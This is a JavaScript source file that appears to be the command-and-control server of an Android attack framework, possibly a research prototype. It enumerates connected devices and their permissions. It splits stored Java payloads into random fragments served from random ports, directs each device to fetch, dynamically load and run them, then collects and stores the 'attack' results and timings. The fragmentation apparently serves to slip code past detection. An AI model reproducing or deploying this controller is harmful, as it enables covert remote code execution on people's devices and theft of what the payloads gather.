const attacks = require('../../database/models/attackResult');
const payloads = require('../../database/models/payload');
const cryptoManager = require('../../utils/CryptoManager');

async function showAllDevices(socketManager) {
    return new Promise((resolve, reject) => {
        const socks = socketManager.socketMain.getSocketsMap();
        //console.log(socks);
        let arr = [];

        socks.forEach((value, port) => {
            arr.push({
                ip: value.socket.remoteAddress,
                port: port,
                model: value.model,
                api : value.api,
                permissions : value.permissions,
                permissionsGranted : value.permissionsGranted
            });
        });

        resolve(arr);
    });
}

async function triggerDevice(socketManager, device, payload_id) {
    return new Promise((resolve, reject) => {
        const sourcePort = device.port;
        payloads.readOneById(payload_id)
            .then( (payload) => {
                const javaCode = payload.content;
                const javaPieces = splitJavaCode(javaCode);
                console.log(javaPieces);

                const randomCodeSenderPorts = getRandomPorts(socketManager, javaPieces.length);
                console.log(randomCodeSenderPorts);

                //build send string with ips and ports
                let serversListStringed = "Servers: ";
                for (let i = 0; i < javaPieces.length; i++) {
                    serversListStringed += "192.168.1.5:" + randomCodeSenderPorts[i] + "|";
                    socketManager.socketCodeSender.openNewSocketCodeSender("192.168.1.5", randomCodeSenderPorts[i], javaPieces[i]);
                }
                socketManager.socketMain.writeOnSocketByPort(sourcePort, serversListStringed)


                const randomPortCollector = getRandomPort(40000, 40100);

                socketManager.socketMain.writeOnSocketByPort(sourcePort, 'Collector: 192.168.1.5:' + randomPortCollector);
                socketManager.socketMain.writeOnSocketByPort(sourcePort, 'Result Type: ' +  payload.resultType);

                socketManager.socketCollector.openNewSocketAndWaitForResult("192.168.1.5", randomPortCollector)
                    .then((result) => {
                        const tIndex = result.toString().indexOf("Timing: ");
                        const resultIndex = result.toString().indexOf("|");
                        console.log(tIndex);
                        console.log(resultIndex);

                        const all = result.toString().substring(tIndex+8, resultIndex);
                        const allSplitted = all.split('~');
                        console.log(allSplitted);

                        const timing = {
                            download_time : parseFloat(allSplitted[0]),
                            parse_time : parseFloat(allSplitted[1]),
                            compile_time : parseFloat(allSplitted[2]),
                            dynamic_loading_time : parseFloat(allSplitted[3]),
                            execution_time : parseFloat(allSplitted[4])
                        }

                        const resultString = result.toString().substring(resultIndex+9);
                        const newAttack = {
                            device : device,
                            payload_id : payload_id,
                            result : resultString,
                            timing: timing,
                            resultType: payload.resultType
                        };
                        console.log(resultString);

                        attacks.create(newAttack);
                        resolve(newAttack);
                    })
                    .catch((error) => {
                        reject({status: 501, message: error});
                    })
                    .finally(() => {
                        socketManager.releasePorts(randomCodeSenderPorts);
                    });
            })
            .catch((error) => {
                console.log(error);
                reject({status: 404, message: 'payload not found'})
            });
    });
}
function splitJavaCode(javaCode) {
    const stringLength = javaCode.length - 1;
    let javaPieces = [];

    let i = 0;
    while(i <= stringLength) {
        const newIndex = getRandomInteger(i, stringLength);
        const substringLenght = newIndex - i  + 1;
        javaPieces.push(javaCode.substr(i, substringLenght));
        i = newIndex + 1;
    }

    return javaPieces;
}


function getRandomPorts(socketManager, n) {
    let randomPorts = [];
    let port;
    while (randomPorts.length < n) {
        port = socketManager.requireFreeCodeSenderPort();
        if (port && randomPorts.indexOf(port) === -1) {
            randomPorts.push(port);
        }
    }
    return randomPorts;
}


function getRandomPort(lowestPort, highestPort) {
    return getRandomInteger(lowestPort, highestPort);
}
function getRandomInteger(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min)) + min; //Il max è escluso e il min è incluso
}

module.exports = {
    showAllDevices,
    triggerDevice
};
